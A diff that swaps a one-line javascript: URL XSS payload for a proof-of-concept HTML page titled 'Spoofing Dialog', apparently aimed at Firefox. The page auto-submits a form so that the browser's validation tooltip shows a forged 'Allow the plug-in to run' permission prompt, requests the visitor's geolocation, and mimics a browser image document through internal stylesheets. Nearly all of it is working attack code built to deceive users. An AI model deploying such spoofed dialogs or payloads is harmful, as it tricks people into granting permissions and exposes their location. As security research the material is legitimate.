@@ -1,1 +1,55 @@
-<img src="javascript:alert()">
+ÿþ<!DOCTYPE HTML>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="viewport" content="width=device-width; height=device-height;">
+<link rel="stylesheet" href="resource://gre/res/ImageDocument.css"><link rel="stylesheet" href="resource://gre/res/TopLevelImageDocument.css"><link rel="stylesheet" href="chrome://global/skin/media/TopLevelImageDocument.css">
+<style>
+#aaa{
+position:absolute;
+left:68px;
+top:-20px;
+z-index:1;
+height:0px;
+width:1px;
+}
+#bbb{
+display:none;
+}
+</style>
+<title>Spoofing Dialog</title>
+ <script>
+function test(){
+aaa = document.getElementById("aaa");
+aaa.style.opacity = '1';
+aaa.oninvalid = function (e) {
+e.target.setCustomValidity("------------------------------------------------------------------\n/ / / / / / / / / / / / / / / / / / This site is trying to play a media player, this action / / / / / / / requires user permission.\nAllow the plug-in to run\n/ / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / ----");
+};
+setInterval("document.getElementById('bbb').click()",20);
+}
+</script>
+<form>
+    <input placeholder="aaa" required id="aaa" />
+    <input id='bbb' type="submit" name="submit">
+</form>
+<body onload="test()"/>
+
+<script type="text/javascript">
+if(navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(function(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+			alert(latitude+' '+longitude);
+});
+ 
+} else {
+    alert("NO");
+}
+</script>
+</head>
+<center> <img src="file:///C:/Users/Support/Desktop/1.jpg" class="shrinkToFit" width="90%" height="90%"></center>
+<body>
+
+</body>
+</html>
+
+
